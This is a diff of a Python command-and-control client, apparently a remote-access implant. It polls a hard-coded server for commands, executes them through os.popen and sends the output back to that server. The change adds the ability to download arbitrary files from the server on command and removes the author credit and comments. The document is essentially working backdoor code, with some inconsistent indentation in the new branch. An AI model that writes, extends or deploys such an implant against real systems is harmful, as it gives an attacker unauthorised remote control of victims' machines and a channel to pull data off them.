@@ -1,14 +1,12 @@
-# c2_client.py - Ethan Zeevi
+# c2_client.py
 import requests
 import time
 import os
 import uuid
 
-# CHANGE TO C2SERVER IP ADDRESS & PORT
 SERVER_URL = "http://100.64.4.148:5000"
 CLIENT_ID = str(uuid.uuid4())  # Generate a unique client ID for each client
 
-# Allows C2 clients to be tracked dynamically
 def register_client():
     try:
         response = requests.post(f"{SERVER_URL}/register_client", json={'client_id': CLIENT_ID})
@@ -19,7 +17,22 @@ def register_client():
     except Exception as e:
         print(f"Error registering client: {e}")
 
-# Retrives command from endpoint to be ran on the client
+
+def download_file(file_name):
+    """
+    Downloads a file from the server and saves it locally.
+    """
+    try:
+        response = requests.get(f"{SERVER_URL}/download/{file_name}")
+        if response.status_code == 200:
+            with open(file_name, 'wb') as f:
+                f.write(response.content)
+            print(f"File '{file_name}' downloaded successfully.")
+        else:
+            print(f"Error: File not found. Status Code: {response.status_code}")
+    except Exception as e:
+        print(f"Error downloading file: {e}")
+
 def get_command():
     try:
         response = requests.get(f"{SERVER_URL}/command/{CLIENT_ID}")
@@ -29,7 +42,6 @@ def get_command():
         print(f"Error fetching command: {e}")
         return ""
 
-# Sends command output to endpoint to be read from the server/user script
 def send_result(result):
     try:
         response = requests.post(f"{SERVER_URL}/result/{CLIENT_ID}", json={'result': result})
@@ -37,16 +49,19 @@ def send_result(result):
     except Exception as e:
         print(f"Error sending result: {e}")
 
-# Uses popen to run the command retrieved from the endpoint
 def execute_command(command):
     if command == "":
         return "No command received."
-
-    try:
-        output = os.popen(command).read()
-        return output if output else "Command executed with no output."
-    except Exception as e:
-        return f"Error executing command: {e}"
+    elif command.startswith("download"):
+        _, file_name = command.split(" ", 1)
+        print(f"Received command to download '{file_name}' from the server.")
+        download_file(file_name)
+    else:
+    	try:
+        	output = os.popen(command).read()
+        	return output if output else "Command executed with no output."
+    	except Exception as e:
+        	return f"Error executing command: {e}"
 
 if __name__ == "__main__":
     print(f"Client ID: {CLIENT_ID}")
@@ -60,4 +75,3 @@ if __name__ == "__main__":
             print(f"Command result: {result}")
             send_result(result)
         time.sleep(10)  # Check every 10 seconds
-
